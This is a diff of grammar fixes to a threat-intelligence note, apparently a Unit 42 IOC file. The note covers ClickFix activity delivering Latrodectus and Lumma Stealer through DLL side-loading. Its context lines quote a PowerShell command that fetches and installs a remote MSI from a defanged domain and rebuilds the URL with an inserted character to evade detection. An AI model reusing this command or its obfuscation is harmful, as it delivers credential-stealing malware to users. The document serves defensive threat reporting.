@@ -16,8 +16,8 @@ BACKGROUND:
 
 NOTES:
 
-- In this wave of ClickFix activity, the malicious PowerShell script retrieves and an .msi file and runs it in system memory.
-- From system memory, the .msi file drops a legitimate EXE and malicious DLL used for DLL side-loading.
+- In this wave of ClickFix activity, the malicious PowerShell script retrieves an .msi file and runs it in system memory.
+- From system memory, the .msi file drops a legitimate EXE and a malicious DLL used for DLL side-loading.
 - The malicious DLL appears to be associated with Latroductus (Blackwidow) malware.
 - The follow-up malware appears to be Lumma Stealer.
 
@@ -31,8 +31,8 @@ EXAMPLE OF CLICKFIX STYLE SCRIPT:
   WindowsInstaller.Installer;$i.UILevel=2;$u='htps://thob[.]live/'.Insert(2,'t');$i.InstallProduct($u,'')"; 
   Service connection checkup : 1734
 
-- Note 1: the "htps://" above is not a typo. The script inserters another "t" using ".Insert(2,'t')"
-- Note 2: the "thob[.]live" domain in above script is de-fanged.
+- Note 1: The "htps://" above is not a typo. The script inserts another "t" using ".Insert(2,'t')"
+- Note 2: The "thob[.]live" domain in above script is de-fanged.
 
 EXAMPLES OF DOMAINS FROM THE INITIAL CLICKFIX STYLE SCRIPT:
 
@@ -58,7 +58,7 @@ LATRODECTUS (BLACKWIDOW) C2 DOMAINS NOTED:
 - Note: Lumma Stealer would have been sent through the Latrodectus C2 traffic, which we've seen before at:
   -- https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2024-03-07-IOCs-for-Latrodectus-and-Lumma-Stealer.txt
 
-UNIQUE SIGNERS OF DIGITAL SIGNATURE ASSOCIATED WITH SOME OF THE MALWARE: 
+UNIQUE SIGNERS OF DIGITAL SIGNATURES ASSOCIATED WITH SOME OF THE MALWARE: 
 
 - Tim Instruments Limited Liability Company
 - LLC Freshmix
@@ -103,7 +103,7 @@ FILES SEEN DURING THIS INFECTION:
 - File size: 3,342,376 bytes
 - File name: NVIDIA Notification.exe
 - File type: PE32+ executable (GUI) x86-64, for MS Windows
-- File description: Legitimate Windows EXE used to side-load malicious DLL named libcef.dll
+- File description: Legitimate Windows EXE used to side-load a malicious DLL named libcef.dll
 - Note: This file is not malicious
 
 FOLLOW-UP LUMMA STEALER INFORMATION:
